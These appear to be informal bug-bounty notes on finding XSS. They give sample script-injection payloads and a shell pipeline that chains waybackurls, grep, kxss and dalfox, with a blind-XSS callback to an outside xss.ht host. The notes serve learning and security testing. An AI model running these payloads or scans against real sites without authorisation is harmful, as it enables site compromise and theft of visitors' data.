So in the previous file we had something like '"><script>confirm(1)</script>' so some websites or the developers may block this type of things so in that case we have to use a custom payload lists to get efficient results or we are going to make our own dynamic xss scripts so lets see it..
------------------------
Here we had 2 parts such as
1. 1st check the urls were accepting the special characters or not . So in case if the website / target was accepting and not filtered then we need to choose a correct "xss payloads over there"
it mean ---> check whether the target accept special characters or not if accept move to 2nd part.

2. We need to use VALID XSS PAYLOAD
---------------------------------------
READ THE BELOW LINES:

1. For example we got a list of 1000 urls from a target via WAYBACKURLS tool

2. Now using "grep" we filtered the 1000 targets with the help of "=" symbol and got a result of 500 urls in response

3. Now we have to check that whether the "special characters were filtering or not"

4. If not filtering such as <script>alert(1)</script> then we have to go with valid XSS Payload

5. See the below script
------------
$ cat target.txt    ----> just read the file
| kxss		    ----> This will filterout the special chars
| sed 's/=.*/=/'    ----> This  will remove everthing after = , add =
| sed 's/URL: //'   ----> Remove URL: and white spaces
| dalfox pipe	    ----> dalfox tool for xss payload
-b https://target.xss.ht --> BXSS payload adder.

kxss was present at tomnomnom github repo

dalfox was found in dalfox github page

so to test only 1st 100 urls in a text file then we use this such as

$ head -n 100 target.txt | remaining cmd
